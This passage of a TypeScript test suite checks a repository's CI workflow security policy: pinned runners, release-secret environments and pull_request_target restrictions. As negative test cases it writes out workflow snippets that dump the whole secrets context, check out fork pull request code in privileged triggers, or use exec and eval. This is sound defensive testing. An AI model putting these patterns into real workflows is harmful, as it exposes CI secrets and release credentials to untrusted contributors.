    });

    it("accepts gh api, gh pr view and gh pr diff in a run step", () => {
      expect(problemsWith("gh pr view 7 --json files > files.json && gh pr diff 7 > pr.diff && gh api rate_limit")).toEqual([]);
    });

    const scopePath = "scripts/check-cluster-scope.mjs";
    const scopeSource = repoFile(scopePath) as string;
    const moduleProblems = (content: string) =>
      pullRequestTargetExecutedFiles("cluster-detector.yml", cluster, withFile(scopePath, content)).problems;

    it.each([
      ["exec with a string command", "exec(`gh pr checkout ${number}`);", "runs a shell command string (exec/execSync)"],
      ["execSync", "childProcess.execSync(command);", "runs a shell command string (exec/execSync)"],
      ["spawn of a computed program", "spawnSync(tool, args);", "starts a child process whose program is not a string literal"],
      ["execFile of a template program", "execFile(`g${'h'}`, args);", "starts a child process whose program is not a string literal"],
      ["a worker", "new Worker(new URL('./worker.mjs', import.meta.url));", "starts a worker"],
      ["a shell", "spawnSync(\"gh\", [\"api\", path], { shell: true });", "runs a child process through a shell"],
      ["eval", "eval(code);", "evaluates a string as code"],
      ["new Function", "new Function(\"return 1\")();", "builds a function from a string"],
    ])("refuses %s inside a pinned module", (_label, code, what) => {
      expect(moduleProblems(`${scopeSource}\n${code}\n`)).toContain(`${scopePath} ${what}, which this check does not follow`);
    });

    it.each([
      ["pr checkout", "spawnSync(\"gh\", [\"pr\", \"checkout\", number]);", "runs gh pr checkout"],
      ["repo clone", "spawnSync(\"gh\", [\"repo\", \"clone\", repo]);", "runs gh repo clone"],
      ["an extension", "spawnSync(\"gh\", [\"some-extension\"]);", "runs gh some-extension"],
      ["args from a parameter", "function run(args) {\n  return spawnSync(\"gh\", args);\n}", "runs gh with args"],
    ])("refuses gh %s inside a pinned module", (_label, code, what) => {
      expect(moduleProblems(`${scopeSource}\n${code}\n`))
        .toContain(`${scopePath} ${what}, which is not gh api, gh pr view or gh pr diff`);
    });

    it("reads createGhApiRequester's args literal, so changing its subcommand is refused", () => {
      expect(moduleProblems(scopeSource)).toEqual([]);
      const original = 'const args = ["api", "--method", "GET", endpoint];';
      expect(scopeSource).toContain(original);
      expect(moduleProblems(scopeSource.replace(original, 'const args = ["run", "--method", "GET", endpoint];')))
        .toEqual([`${scopePath} runs gh run --method, which is not gh api, gh pr view or gh pr diff`]);
      expect(moduleProblems(`${scopeSource}\nspawnSync("gh", ["pr", "view", "7"]);\nspawnSync("gh", ["pr", "diff", "7"]);\n`)).toEqual([]);
    });

    it("refuses a source include inside a pinned shell script", () => {
      const read = withFile("scripts/cluster-policy.sh", "set -e\nsource \"$HELPERS\"\n");
      expect(problemsWith("bash .cluster-policy/scripts/cluster-policy.sh", read))
        .toEqual(["scripts/cluster-policy.sh sources another file, which this check does not follow"]);
    });
  });

  describe("workflow runner policy mutations", () => {
    const base = (job: Record<string, unknown>, on: unknown = { pull_request: null, push: null }) =>
      stringifyYaml({ on, permissions: { contents: "read" }, jobs: { check: { steps: [{ run: "true" }], ...job } } });
    const matrix = (os: unknown[]) => ({ "runs-on": "${{ matrix.os }}", strategy: { matrix: { include: os.map((label) => ({ os: label })) } } });

    it("accepts a hosted label and a static matrix of hosted labels", () => {
      expect(workflowRunnerViolations(base({ "runs-on": "ubuntu-latest" }), "ok.yml")).toEqual([]);
      expect(workflowRunnerViolations(base(matrix(["macos-15", "windows-2025"]), { workflow_dispatch: null }), "ok.yml"))
        .toEqual([]);
    });

    it.each([
      ["a self-hosted literal", { "runs-on": "self-hosted" }],
      ["a label array", { "runs-on": ["self-hosted", "Linux"] }],
      ["a repository variable", { "runs-on": "${{ vars.AVE_LINUX_RUNNER && fromJSON(vars.AVE_LINUX_RUNNER) || 'ubuntu-latest' }}" }],
      ["a guarded repository variable", { "runs-on": "${{ github.event_name == 'push' && fromJSON(vars.AVE_LINUX_RUNNER) || 'ubuntu-latest' }}" }],
      ["a matrix entry that is not hosted", matrix(["macos-15", "self-hosted"])],
      ["a matrix entry from a variable", matrix(["${{ fromJSON(vars.AVE_MACOS_RUNNER) }}"])],
      ["a computed matrix", { "runs-on": "${{ matrix.os }}", strategy: { matrix: "${{ fromJSON(needs.plan.outputs.matrix) }}" } }],
    ])("rejects %s, on trusted and fork-reachable workflows alike", (_label, job) => {
      expect(workflowRunnerViolations(base(job), "bad.yml")).toHaveLength(1);
      expect(workflowRunnerViolations(base(job, { workflow_dispatch: null }), "bad.yml")).toHaveLength(1);
    });

    it.each(["issue_comment", "pull_request_review", "workflow_run", "discussion_comment", "a_future_event"])(
      "treats %s as fork-reachable",
      (event) => {
        const noPermissions = stringifyYaml({ on: { [event]: null }, jobs: { check: { "runs-on": "ubuntu-latest", steps: [{ run: "true" }] } } });
        expect(workflowRunnerViolations(noPermissions, "bad.yml")).toEqual(["bad.yml:check has no permissions block"]);
      },
    );

    it("requires a permissions block and refuses write-all", () => {
      const noPermissions = stringifyYaml({ on: "pull_request", jobs: { check: { "runs-on": "ubuntu-latest" } } });
      expect(workflowRunnerViolations(noPermissions, "bad.yml")).toEqual(["bad.yml:check has no permissions block"]);
      expect(workflowRunnerViolations(base({ "runs-on": "ubuntu-latest", permissions: "write-all" }), "bad.yml"))
        .toEqual(["bad.yml:check grants write-all"]);
    });

    it("refuses pull request code, write tokens and secrets under pull_request_target", () => {
      const target = (step: Record<string, unknown>, job: Record<string, unknown> = {}) =>
        workflowRunnerViolations(
          base({ "runs-on": "ubuntu-latest", steps: [step], ...job }, { pull_request_target: null }),
          "t.yml",
        );
      const checkout = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1";
      const trusted = { ref: "${{ steps.pr-snapshot.outputs.base_sha }}", "persist-credentials": false };
      expect(target({ uses: checkout, with: trusted })).toEqual([]);
      expect(target({ uses: checkout, with: { ...trusted, ref: "${{ github.event.pull_request.head.sha }}" } }))
        .toHaveLength(1);
      expect(target({ uses: checkout, with: { ...trusted, repository: "${{ github.event.pull_request.head.repo.full_name }}" } }))
        .toHaveLength(1);
      expect(target({ uses: checkout, with: { ref: trusted.ref } })).toHaveLength(1);
      expect(target({ run: "true", env: { TOKEN: "${{ secrets.NPM_TOKEN }}" } })).toHaveLength(1);
      expect(target({ run: "true" }, { permissions: { "pull-requests": "write" } })).toHaveLength(1);
    });

    const underTarget = (step: Record<string, unknown>) => workflowRunnerViolations(
      base({ "runs-on": "ubuntu-latest", steps: [step] }, { pull_request_target: null }),
      "t.yml",
    );

    it.each([
      ["the whole context serialized", { run: "echo \"${{ toJSON(secrets) }}\"" }],
      ["the bare context", { run: "true", env: { ALL: "${{ secrets }}" } }],
      ["the context passed to a function", { run: "true", env: { ALL: "${{ format('{0}', secrets) }}" } }],
      ["a computed key", { run: "true", env: { ONE: "${{ secrets[inputs.name] }}" } }],
      ["a step condition", { run: "true", if: "secrets.NPM_TOKEN != ''" }],
    ])("refuses a secret read under pull_request_target through %s", (_label, step) => {
      expect(underTarget(step)).toEqual(["t.yml reads a secret under pull_request_target"]);
    });

    it.each([
      ["gh pr checkout", "gh pr checkout ${{ github.event.pull_request.number }}"],
      ["a pull/<n>/head refspec", "git fetch origin pull/${{ github.event.pull_request.number }}/head:pr && git switch pr"],
      ["a pull/<n>/merge refspec", "git fetch origin +pull/7/merge"],
      ["a refs/pull/ ref", "git fetch origin refs/pull/7/head"],
      ["the head sha from the payload", "git fetch origin && git checkout ${{ github.event.pull_request.head.sha }}"],
      ["the head branch", "git checkout \"${{ github.head_ref }}\""],
    ])("refuses a run step that fetches pull request code under pull_request_target through %s", (_label, run) => {
      expect(underTarget({ run })).toEqual(["t.yml:check fetches pull request code in a run step under pull_request_target"]);
    });

    const fetchesPullRequestCode = ["t.yml:check fetches pull request code in a run step under pull_request_target"];

    it.each([
      ["a head sha set on one line and checked out on a later one",
        "SHA='${{ github.event.pull_request.head.sha }}'\necho \"checking $SHA\"\ngit checkout \"$SHA\""],
      ["the head branch from the runner's environment", "git fetch origin \"$GITHUB_HEAD_REF\""],
      ["the head sha read from the event file",
        "H=$(jq -r .pull_request.head.sha \"$GITHUB_EVENT_PATH\")\ngit fetch origin \"$H\""],
    ])("refuses a multi-line run step that fetches pull request code through %s", (_label, run) => {
      expect(underTarget({ run })).toEqual(fetchesPullRequestCode);
    });

    it("refuses a run step that reaches the head commit through step or job env", () => {
      const head = "${{ github.event.pull_request.head.sha }}";
      expect(underTarget({ env: { H: head }, run: "git fetch origin \"$H\"" })).toEqual(fetchesPullRequestCode);
      expect(workflowRunnerViolations(
        base({ "runs-on": "ubuntu-latest", env: { H: head }, steps: [{ run: "set -e\ngit fetch origin $H" }] },
          { pull_request_target: null }),
        "t.yml",
      )).toEqual(fetchesPullRequestCode);
      const workflowEnv = stringifyYaml({
        on: { pull_request_target: null },
        permissions: { contents: "read" },
        env: { REF: "${{ github.head_ref }}" },
        jobs: { check: { "runs-on": "ubuntu-latest", steps: [{ run: "gh repo clone o/r -- --branch \"$REF\"" }] } },
      });
      expect(workflowRunnerViolations(workflowEnv, "t.yml")).toEqual(fetchesPullRequestCode);
      // The same reference with no git or gh in the step is not a checkout.
      expect(underTarget({ env: { H: head }, run: "echo \"$H\"" })).toEqual([]);
    });

    describe("pull request references passed between steps", () => {
      const head = "${{ github.event.pull_request.head.sha }}";
      const writeHead = { id: "a", run: `echo "sha=${head}" >> "$GITHUB_OUTPUT"` };
      const steps = (...list: Record<string, unknown>[]) => workflowRunnerViolations(
        base({ "runs-on": "ubuntu-latest", steps: list }, { pull_request_target: null }),
        "t.yml",
      );
      const job = (extra: Record<string, unknown>, ...list: Record<string, unknown>[]) => workflowRunnerViolations(
        base({ "runs-on": "ubuntu-latest", steps: list, ...extra }, { pull_request_target: null }),
        "t.yml",
      );
      const reason = (text: string) => [`t.yml:check ${text} under pull_request_target`];
      const fetches = reason("fetches pull request code in a run step");

      it.each<[string, Record<string, unknown>[], string[]]>([
        ["an output read in a later script", [writeHead, { run: "git fetch origin ${{ steps.a.outputs.sha }}" }], fetches],
        ["an output read through a later step's env", [
          { id: "a", env: { H: head }, run: "echo \"sha=$H\" >> $GITHUB_OUTPUT" },
          { env: { S: "${{ steps.a.outputs.sha }}" }, run: "set -e\ngit checkout \"$S\"" },
        ], fetches],
        ["an output relayed through a step that runs no git", [
          writeHead,
          { id: "b", run: "echo \"relay=${{ steps.a.outputs.sha }}\" >> \"$GITHUB_OUTPUT\"" },
          { run: "gh pr diff ${{ steps.b.outputs.relay }}" },
        ], fetches],
        ["the head the API returned, written by the step that fetched it", [
          { id: "a", run: "gh api repos/o/r/pulls/7 --jq .head.sha >> \"$GITHUB_OUTPUT\"" },
        ], fetches],
        ["$GITHUB_ENV", [{ run: `echo "PR_SHA=${head}" >> "$GITHUB_ENV"` }, { run: "git fetch origin \"$PR_SHA\"" }],
          reason("exports a pull request reference through $GITHUB_ENV or $GITHUB_PATH")],
        ["$GITHUB_PATH", [{ env: { REF: "${{ github.head_ref }}" }, run: "echo \"$RUNNER_TEMP/$REF\" >> $GITHUB_PATH" }],
          reason("exports a pull request reference through $GITHUB_ENV or $GITHUB_PATH")],
        ["an action input", [writeHead, {
          uses: "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
          with: { ref: "${{ steps.a.outputs.sha }}", "persist-credentials": false },
        }], reason("passes a pull request reference from an earlier step to an action")],
      ])("refuses a pull request reference handed on through %s", (_label, list, expected) => {
        expect(steps(...list)).toEqual(expected);
      });

      it.each<[string, string]>([
        ["the whole context serialized", "git fetch origin \"$(echo '${{ toJSON(steps) }}' | jq -r .a.outputs.sha)\""],
        ["a bracketed output name", "git fetch origin ${{ steps.a.outputs['sha'] }}"],
        ["a bracketed step id", "git fetch origin ${{ steps['a'].outputs.sha }}"],
        ["a wildcard step", "git fetch origin ${{ join(steps.*.outputs.sha, ' ') }}"],
        ["upper-case context and property names", "git fetch origin ${{ STEPS.A.OUTPUTS.sha }}"],
      ])("refuses a tainted step output read through %s", (_label, run) => {
        expect(steps(writeHead, { run })).toEqual(fetches);
      });

      it("lets an exact read of an untainted step through while another step is tainted", () => {
        expect(steps(
          { id: "clean", run: "echo \"base=abc\" >> \"$GITHUB_OUTPUT\"" },
          writeHead,
          { run: "git -C policy cat-file -e ${{ steps.clean.outputs.base }}" },
        )).toEqual([]);
      });

      it.each<[string, Record<string, unknown>]>([
        ["a github-script input", {
          uses: "actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea",
          with: { script: "await exec.exec('git', ['fetch', 'origin', context.payload.pull_request.head.sha])" },
        }],
        ["an action's env", {
          uses: "some/action@60a0d83039c74a4aee543508d2ffcb1c3799cdea",
          env: { REF: "${{ github.event.pull_request.head.ref }}" },
        }],
      ])("refuses pull request code handed straight to an action through %s", (_label, step) => {
        expect(steps(step)).toEqual(reason("passes pull request code to an action"));
      });

      it.each([
        ["the head repository's clone URL", "url=$(gh api repos/o/r/pulls/7 --jq .head.repo.clone_url)\ngit clone \"$url\" pr"],
        ["the head repository's name", "gh repo clone \"$(gh api repos/o/r/pulls/7 --jq '.head.repo.full_name')\""],
        ["a jq pipe from .head", "sha=$(gh api repos/o/r/pulls/7 | jq -r '.head | .sha')\ngit fetch origin \"$sha\""],
      ])("refuses a run step that reaches %s", (_label, run) => {
        expect(steps({ run })).toEqual(fetches);
      });

      it("refuses a job output that maps a tainted step output", () => {
        expect(job({ outputs: { sha: "${{ steps.a.outputs.sha }}" } }, writeHead))
          .toEqual(reason("maps a pull request reference to a job output"));
      });

      it("lets a tainted output gate a later git step, and an untainted one feed it", () => {
        expect(steps(
          { id: "snapshot", run: "gh api repos/o/r/pulls/7 --jq .base.sha | sed 's/^/base_sha=/' >> \"$GITHUB_OUTPUT\"" },
          { id: "current", env: { H: head }, run: "echo \"superseded=$([ \"$H\" = x ] && echo true || echo false)\" >> \"$GITHUB_OUTPUT\"" },
          { if: "steps.current.outputs.superseded != 'true'", env: { B: "${{ steps.snapshot.outputs.base_sha }}" },
            run: "git -C policy rev-parse HEAD | grep -qx \"$B\"" },
        )).toEqual([]);
      });
    });

    it("reads secrets as an expression context, not as a word in a script", () => {
      expect(underTarget({ run: "cat secrets.txt && git log --oneline -1" })).toEqual([]);
    });
  });

  it.each([
    ["dot access", "${{ secrets.R2_BUCKET }}"],
    ["dot access with whitespace", "${{\n secrets \t . \n R2_ACCESS_KEY_ID \n}}"],
    ["single-quoted bracket access", "${{ secrets['R2_SECRET_ACCESS_KEY'] }}"],
    ["double-quoted bracket access", '${{ secrets["R2_ACCOUNT_ID"] }}'],
    ["single-quoted bracket access with whitespace", "${{\nsecrets \t [ \n 'R2_BUCKET' \t ]\n}}"],
    ["double-quoted bracket access with whitespace", '${{\tsecrets [\t "R2_BUCKET" \n ]\t}}'],
    ["context serialization", "${{ toJSON(secrets) }}"],
    ["context serialization with whitespace and mixed case", "${{ ToJson(\n SeCrEtS \t) }}"],
    ["the whole context", "${{ secrets }}"],
    ["the whole context passed to a function", "${{ format('{0}', secrets) }}"],
    ["a computed secret name", "${{ secrets[inputs.secret_name] }}"],
    ["a constructed secret name", "${{ secrets[format('R2_{0}', 'BUCKET')] }}"],
    ["a wildcard secret lookup", "${{ secrets.* }}"],
    ["access after a quoted expression terminator", "${{ format('}}{0}', secrets.R2_BUCKET) }}"],
    ["access after an unrelated expression", "${{ secrets.GITHUB_TOKEN }}:${{ secrets['R2_BUCKET'] }}"],
    ["an expression inside shell quotes", "echo '${{ secrets['R2_BUCKET'] }}'"],
  ])("rejects a release-secret mutation using %s", (_name, value) => {
    const workflow = parseYaml("jobs:\n  consumer:\n    runs-on: self-hosted\n    env:\n      VALUE: public\n    steps:\n      - run: 'true'\n") as {
      jobs: { consumer: { env: { VALUE: string }; environment?: string | { name: string } } };
    };
    const check = () => assertReleaseSecretEnvironments(stringifyYaml(workflow), "mutation.yml");
    expect(check).not.toThrow();
    workflow.jobs.consumer.env.VALUE = value;
    expect(check).toThrow("mutation.yml:consumer reads release secrets without environment: release");
    workflow.jobs.consumer.environment = "staging";
    expect(check).toThrow("mutation.yml:consumer reads release secrets without environment: release");
    workflow.jobs.consumer.environment = "release";
    expect(check).not.toThrow();
    workflow.jobs.consumer.environment = { name: "release" };
    expect(check).not.toThrow();
  });

  it.each<[string, Record<string, unknown>]>([
    ["inherited secrets", { uses: "./.github/workflows/publish.yml", secrets: "inherit" }],
    ["an R2-named reusable-workflow secret", {
      uses: "./.github/workflows/publish.yml",
      secrets: { R2_BUCKET: "${{ inputs.bucket }}" },
    }],
    ["an R2-named secret sourced from another credential", {
      uses: "./.github/workflows/publish.yml",
      secrets: { R2_SECRET_ACCESS_KEY: "${{ secrets.RELEASE_ACCESS_KEY }}" },
    }],
    ["a renamed reusable-workflow secret", {
      uses: "./.github/workflows/publish.yml",
      secrets: { credential: "${{ secrets.R2_SECRET_ACCESS_KEY }}" },
    }],
    ["a single-quoted reusable-workflow secret", {
      uses: "./.github/workflows/publish.yml",
      secrets: { credential: "${{ secrets [ 'R2_BUCKET' ] }}" },
    }],
    ["a double-quoted reusable-workflow secret", {
      uses: "./.github/workflows/publish.yml",
      secrets: { credential: '${{ secrets [ "R2_ACCOUNT_ID" ] }}' },
    }],
    ["the whole context passed to a reusable workflow", {
      uses: "./.github/workflows/publish.yml",
      with: { credentials: "${{ secrets }}" },
    }],
    ["a serialized context passed to a reusable workflow", {
      uses: "./.github/workflows/publish.yml",
      with: { credentials: "${{ toJSON(secrets) }}" },
    }],
    ["an implicit conditional expression", {
      "runs-on": "self-hosted", if: "contains(toJSON(secrets), 'R2_')", steps: [{ run: "true" }],
    }],
    ["an implicit step condition", {
      "runs-on": "self-hosted", steps: [{ if: "contains(toJSON(secrets), 'R2_')", run: "true" }],
    }],
  ])("rejects a release-secret mutation using %s", (_name, job) => {
    const workflow = { jobs: { consumer: { "runs-on": "self-hosted", steps: [{ run: "true" }] } as Record<string, unknown> } };
    const check = () => assertReleaseSecretEnvironments(stringifyYaml(workflow), "mutation.yml");
    expect(check).not.toThrow();
    workflow.jobs.consumer = job;
    expect(check).toThrow("mutation.yml:consumer reads release secrets without environment: release");
  });

  it("rejects workflow-level secret mutations inherited by an unprotected job", () => {
    const workflow = {
      env: { VALUE: "public" },
      jobs: { consumer: { "runs-on": "self-hosted", steps: [{ run: "true" }] } },
    };
    const check = () => assertReleaseSecretEnvironments(stringifyYaml(workflow), "mutation.yml");
    expect(check).not.toThrow();
    workflow.env.VALUE = '${{ secrets [ "R2_BUCKET" ] }}';
    expect(check).toThrow("mutation.yml:consumer reads release secrets without environment: release");
  });

  it.each([
    "${{ secrets.GITHUB_TOKEN }}",
    "${{ secrets [ 'GITHUB_TOKEN' ] }}",
    '${{ secrets [ "GITHUB_TOKEN" ] }}',
    "${{ inputs.secrets }}",
    "${{ toJSON(inputs.secrets) }}",
    "${{ format('{0}', 'secrets.R2_BUCKET') }}",
    "${{ 'escaped '' secrets.R2_BUCKET' }}",
    '${{ "secrets.R2_BUCKET" }}',
    "secrets.R2_BUCKET is an example outside an expression",
  ])("allows unrelated or literal secret text: %s", (value) => {
    const workflow = { jobs: { consumer: { "runs-on": "self-hosted", env: { VALUE: value }, steps: [{ run: "true" }] } } };
    expect(() => assertReleaseSecretEnvironments(stringifyYaml(workflow), "allowed.yml")).not.toThrow();
  });

  it("allows a reusable workflow to receive an unrelated secret", () => {
    const workflow = {
      jobs: { consumer: { uses: "./.github/workflows/publish.yml", secrets: { token: "${{ secrets.GITHUB_TOKEN }}" } } },
    };
    expect(() => assertReleaseSecretEnvironments(stringifyYaml(workflow), "allowed.yml")).not.toThrow();
  });

  it("allows literal if fields in environment values and action inputs", () => {
    const workflow = {
      jobs: {
        consumer: {
          "runs-on": "self-hosted",
          env: { if: "secrets.R2_BUCKET" },
          steps: [{ uses: "./.github/actions/check", with: { if: "secrets.R2_BUCKET" } }],
        },
      },
    };
    expect(() => assertReleaseSecretEnvironments(stringifyYaml(workflow), "allowed.yml")).not.toThrow();
  });

  it("runs contract probes only from main while retaining protected tag publication", () => {
    const jobs = workflowJobs(readRepoFile(".github/workflows/build-installers.yml"));
    const contract = jobs.get("publish-contract");
    if (contract === undefined) throw new Error("build-installers.yml has no publish-contract job");
    expect(contract).toMatch(/^ {4}if: github\.event_name == 'push' \|\| \(github\.event_name == 'workflow_dispatch' && github\.ref == 'refs\/heads\/main' && inputs\.contract_probe == 'true' && inputs\.installer_scope != 'windows-disposable'\)$/mu);
    expect(contract).toContain("if: github.event_name == 'push'");
    expect(contract).toContain('if [ "$REF_PROTECTED" != "true" ]; then');
    expect(contract).toContain('if [ "$tag_object_type" != "tag" ]');
    expect(contract).toContain('if [ "$target_type" != "commit" ] || [ "$target_sha" != "$EXPECTED_SOURCE_SHA" ]; then');
  });

  it("runs the R2 credential probe only by manual dispatch from main and only under _ci-probe/", () => {
    const workflow = readRepoFile(".github/workflows/r2-probe.yml");
    const trigger = workflow.slice(workflow.indexOf("\non:"), workflow.indexOf("\npermissions:"));
    // The probe writes to the live release bucket, so no repository event may
    // start it: only an operator's dispatch.
    expect(trigger.trim()).toBe("on:\n  workflow_dispatch:");
    expect(workflowJobs(workflow).get("probe")).toMatch(/^ {4}if: github\.ref == 'refs\/heads\/main'$/mu);
    expect(workflow).toMatch(/^ {2}contents: read$/mu);
    expect(workflow).not.toContain("continue-on-error");
    expect(workflow).not.toMatch(/set -[a-z]*x/u);
    for (const name of ["R2_ACCOUNT_ID", "R2_ACCESS_KEY_ID", "R2_SECRET_ACCESS_KEY", "R2_BUCKET"]) {
      expect(workflow).toContain(`${name}: \${{ secrets.${name} }}`);
    }
    expect(workflow.match(/secrets\.[A-Z0-9_]+/gu)?.sort()).toEqual(
      ["secrets.R2_ACCESS_KEY_ID", "secrets.R2_ACCOUNT_ID", "secrets.R2_BUCKET", "secrets.R2_SECRET_ACCESS_KEY"],
    );
    expect(workflow).toContain("PROBE_KEY: _ci-probe/${{ github.run_id }}-${{ github.run_attempt }}.txt");
    for (const operation of ["put-object", "list-objects-v2", "delete-object"]) {
      expect(workflow).toContain(`r2 ${operation} `);
    }
  });

  it("runs every release Linux job on the pinned hosted ARM64 image", () => {
    const linuxRunner = "runs-on: ubuntu-24.04-arm";
    const installers = workflowJobs(readRepoFile(".github/workflows/build-installers.yml"));
    for (const id of ["release-profile", "publish-release", "publish-r2", "publish-contract"]) {
      const body = installers.get(id);
      if (body === undefined) throw new Error(`build-installers.yml has no ${id} job`);
      expect(body.match(/^ {4}runs-on: .*$/gmu), id).toEqual([`    ${linuxRunner}`]);
    }
    for (const id of ["installers", "publish-release", "publish-r2"]) {
      expect(installers.get(id), id).toMatch(/^ {4}needs: (?:release-profile|\[release-profile, installers\])$/mu);
    }
    const probe = workflowJobs(readRepoFile(".github/workflows/r2-probe.yml")).get("probe");
    if (probe === undefined) throw new Error("r2-probe.yml has no probe job");
    expect(probe.match(/^ {4}runs-on: .*$/gmu)).toEqual([`    ${linuxRunner}`]);
    // No workflow reads a runner from a repository variable any more, so the
    // AVE_*_RUNNER variables can be deleted without changing any run.
    for (const name of workflowFileNames()) {
      expect(readRepoFile(`.github/workflows/${name}`), name).not.toMatch(/vars\.AVE_[A-Z]+_RUNNER/u);
    }
    expect(existsSync(resolve(root, ".github/scripts/require-runner-vars.sh"))).toBe(false);
  });

  it("ships x64 Linux installers from any runner arch and refuses a foreign-arch binary", () => {
    const installers = workflowJobs(readRepoFile(".github/workflows/build-installers.yml")).get("installers");
    if (installers === undefined) throw new Error("build-installers.yml has no installers job");
    const buildInstallers = readRepoFile("scripts/build-installers.mjs");
    const afterPack = readRepoFile("scripts/electron-after-pack.cjs");

    // The target arch is pinned, never inferred from the runner.
    const build = jobRunCommands(installers).find((command) => command.includes("node scripts/build-installers.mjs"));
    expect(build).toContain('if [ "${{ matrix.target }}" = "linux" ]; then\n# Linux installers ship x64 whatever the runner\'s arch.\nargs+=("--arch" "x64")\nfi\n');

    // The arch audit is a plain, unconditional-on-success Linux step between
    // the build and anything that launches or uploads the package.
    const audit = "node scripts/verify-linux-package-arch.mjs --release-dir release --arch x64 --require-installers";
    expect(jobRunCommands(installers).filter((command) => command.includes(audit))).toEqual([`set -euo pipefail\n${audit}`]);
    const auditAt = installers.indexOf(audit);
    expect(auditAt).toBeGreaterThan(installers.indexOf("node scripts/build-installers.mjs"));
    expect(auditAt).toBeLessThan(installers.indexOf("Smoke launch packaged app"));
    expect(auditAt).toBeLessThan(installers.indexOf("Upload installers"));
    expect(installers).not.toContain("continue-on-error");

    // An ARM64 host cannot launch the x64 app without host-wide binfmt; the
    // launch gates skip only there, by the host's own arch.
    expect(installers).toContain('if [ "${{ matrix.target }}" = "linux" ] && [ "$(uname -m)" != "x86_64" ]; then');
    for (const step of ["Smoke launch packaged app", "Packaged escape gate"]) {
      const at = installers.indexOf(`- name: ${step}`);
      expect(installers.slice(at, installers.indexOf("\n      - ", at + 1)), step).toContain(
        "if: >-\n          steps.launch.outputs.run == 'true'\n          && (matrix.target != 'mac' || steps.build.outputs.skip_sign != 'true')\n",
      );
    }

    // Cross mode: target-arch node_modules from the frozen lockfile with no
    // install script, node-pty compiled by the cross toolchain, and no
    // electron-builder rebuild with the host compiler.
    expect(buildInstallers).toContain('"--frozen-lockfile", "--ignore-scripts", `--cpu=${arch}`, "--os=linux"');
    expect(buildInstallers).toContain('"arm64->x64": { triple: "x86_64-linux-gnu", gypArch: "x64" }');
    expect(buildInstallers).toContain("requires --skip-native-rebuild");
    expect(buildInstallers).toContain("cross-build: node-pty compiled as");
    // Only the packed arch's node-pty prebuild and sandbox helper ship.
    expect(afterPack).toContain("pruneForeignNodePtyPrebuilds(context);");
    expect(afterPack).toContain("if (archDir !== arch) rmSync(join(keepRoot, archDir), { recursive: true, force: true });");
  });

  it("builds macOS and Windows installers on pinned hosted images", () => {
    const installers = workflowJobs(readRepoFile(".github/workflows/build-installers.yml")).get("installers");
    if (installers === undefined) throw new Error("build-installers.yml has no installers job");

    // Each matrix entry names a pinned hosted image; the Linux entry
    // cross-builds x64 on the ARM64 image.
    expect(installers.match(/^ {12}os: .*$/gmu)).toEqual([
      "            os: macos-15",
      "            os: ubuntu-24.04-arm",
      "            os: windows-2025",
    ]);
    expect(installers.match(/^ {4}runs-on: .*$/gmu)).toEqual(["    runs-on: ${{ matrix.os }}"]);

    // Every step runs in one shell that exists on all three hosts.
    expect(installers).toMatch(/^ {4}defaults:\n {6}run:\n {8}shell: bash$/mu);

    // The checkout keeps no token, and Node is the pinned 24 rather than the
    // image's own. Nothing is left over from a self-hosted runner: no clean
    // or build-output removal for a persistent workspace, and no branch on
    // the runner's environment, since every job runs on a hosted image.
    expect(installers).toMatch(/^ {10}persist-credentials: false$/mu);
    expect(installers).not.toContain("Remove build output");
    for (const name of workflowFileNames()) {
      expect(readRepoFile(`.github/workflows/${name}`), name).not.toContain("runner.environment");
    }
    expectPinnedAction(installers, "actions/setup-node");
    expect(installers).toContain('node-version: "24"');
    const setupNode = installers.indexOf("uses: actions/setup-node@");
    expect(setupNode).toBeGreaterThan(installers.indexOf("uses: actions/checkout@"));
    expect(setupNode).toBeLessThan(installers.indexOf("node scripts/build-installers.mjs"));

    // Every workflow gets bun from the shared setup-bun action, with the
    // version from .bun-version (ci.yml checks the repository out under ave/).
    // The action installs under RUNNER_TEMP, so it never replaces the owner's
    // bun, and its last step proves the job-local pinned bun is on PATH.
    expect(installers).toContain(
      "      - uses: ./.github/actions/setup-bun\n"
        + "        with:\n"
        + "          bun-version-file: .bun-version\n",
    );
    expect(installers.indexOf("uses: ./.github/actions/setup-bun")).toBeLessThan(
      installers.indexOf("bun install --frozen-lockfile"),
    );
    expect(readRepoFile(".bun-version")).toMatch(/^\d+\.\d+\.\d+\n$/u);
    const ci = readRepoFile(".github/workflows/ci.yml");
    const ciSetups = ci.match(/uses: \.\/ave\/\.github\/actions\/setup-bun\n/gu)?.length ?? 0;
    expect(ciSetups).toBeGreaterThan(0);
    expect(ci.match(/bun-version-file: ave\/\.bun-version\n/gu)?.length).toBe(ciSetups);
    for (const name of readdirSync(resolve(root, ".github/workflows")).filter((entry) => /\.ya?ml$/u.test(entry))) {
      expect(
        readRepoFile(`.github/workflows/${name}`),
        `${name}: install bun through .github/actions/setup-bun, not oven-sh/setup-bun directly`,
      ).not.toContain("oven-sh/setup-bun");
    }

    // setup-bun v2.2.0 symlinks bunx.exe to bun.exe before anything else, and
    // a runner service account on Windows lacks the symlink privilege (EPERM).
    // The action keeps setup-bun off Windows and installs the release there
    // only after its SHA-256 matches the release's SHASUMS256.txt.
    const setupBun = readRepoFile(".github/actions/setup-bun/action.yml");
    expect(setupBun).toContain(
      "    - if: runner.os != 'Windows'\n"
        + "      uses: oven-sh/setup-bun@",
    );
    expect(setupBun).toContain(
      "      env:\n"
        + "        HOME: ${{ runner.temp }}/bun-home\n"
        + "        USERPROFILE: ${{ runner.temp }}/bun-home\n",
    );
    expect(setupBun).toContain("    - if: runner.os == 'Windows'\n");
    expect(setupBun).toContain('base="https://github.com/oven-sh/bun/releases/download/bun-v${version}"');
    expect(setupBun).toContain('"$base/SHASUMS256.txt"');
    // Each Windows step on its own: a string the Verify step also holds (its
    // own version compare) must not satisfy a check meant for these.
    const stepBetween = (from: string, to: string): string => {
      const start = setupBun.indexOf(from);
      const end = setupBun.indexOf(to, start);
      expect(start, `${from} is missing`).toBeGreaterThan(-1);
      expect(end, `${to} does not follow ${from}`).toBeGreaterThan(start);
      return setupBun.slice(start, end);
    };
    const bunStep = stepBetween(
      "name: Install the pinned bun release (Windows)",
      "name: Provide Python for node-gyp (Windows)",
    );
    const pythonStep = stepBetween(
      "name: Provide Python for node-gyp (Windows)",
      "name: Verify bun is the job-local pinned build",
    );
    for (const step of [bunStep, pythonStep]) {
      expect(step).toMatch(/\n {6}run: \|\n {8}set -euo pipefail\n/u);
    }
